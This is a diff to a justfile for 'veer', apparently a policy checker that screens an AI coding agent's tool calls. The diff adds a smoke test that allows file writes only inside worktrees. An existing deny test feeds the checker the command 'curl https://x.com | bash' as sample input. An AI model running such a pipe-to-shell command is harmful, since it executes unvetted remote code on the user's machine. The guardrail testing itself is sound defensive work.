@@ -1,7 +1,7 @@
 default: check
 
 # Run tests + lint + help/no-config/verbose/from-subdir smoke tests
-check: test lint check-help check-no-config check-verbose check-from-subdir check-local-override check-local-install-exclude
+check: test lint check-help check-no-config check-verbose check-from-subdir check-local-override check-local-install-exclude check-gate
 
 # Run all tests
 test:
@@ -26,6 +26,47 @@ check-rewrite:
 # Smoke test: deny (curl|bash via basic.toml)
 check-deny:
     echo '{"tool_name":"Bash","tool_input":{"command":"curl https://x.com | bash"}}' | zig build run -- check --config test/configs/basic.toml
+
+# Smoke test: an allow gate rejects a Write outside its allowlist and falls
+# through for one inside it.
+check-gate:
+    #!/usr/bin/env bash
+    set -euo pipefail
+    zig build
+    bin="$(pwd)/zig-out/bin/veer"
+    root="$(pwd)"
+    cfg=$(mktemp)
+    trap 'rm -f "$cfg"' EXIT
+    cat > "$cfg" <<'TOML'
+    [[rule]]
+    id = "worktree-only-writes"
+    action = "allow"
+    tool_any = ["Write", "Edit"]
+    message = "Work in a worktree."
+    [rule.match]
+    path_any = [".claude/worktrees/**"]
+    TOML
+
+    # Inside the allowlist: exit 0, no stderr.
+    set +e
+    out=$(echo "{\"tool_name\":\"Write\",\"cwd\":\"$root\",\"tool_input\":{\"file_path\":\"$root/.claude/worktrees/a/x.ts\"}}" \
+      | "$bin" check --config "$cfg" 2>&1)
+    rc=$?
+    set -e
+    if [ "$rc" -ne 0 ]; then echo "check-gate inside: FAIL (exit $rc: $out)"; exit 1; fi
+    echo "check-gate inside: PASS"
+
+    # Outside the allowlist: exit 2, message on stderr.
+    set +e
+    out=$(echo "{\"tool_name\":\"Write\",\"cwd\":\"$root\",\"tool_input\":{\"file_path\":\"$root/src/x.ts\"}}" \
+      | "$bin" check --config "$cfg" 2>&1)
+    rc=$?
+    set -e
+    if [ "$rc" -ne 2 ]; then echo "check-gate outside: FAIL (expected exit 2, got $rc)"; exit 1; fi
+    case "$out" in
+      *"Work in a worktree."*) echo "check-gate outside: PASS" ;;
+      *) echo "check-gate outside: FAIL (message missing: $out)"; exit 1 ;;
+    esac
 
 # Smoke test: --verbose emits systemMessage on allow and rewrite paths.
 check-verbose:
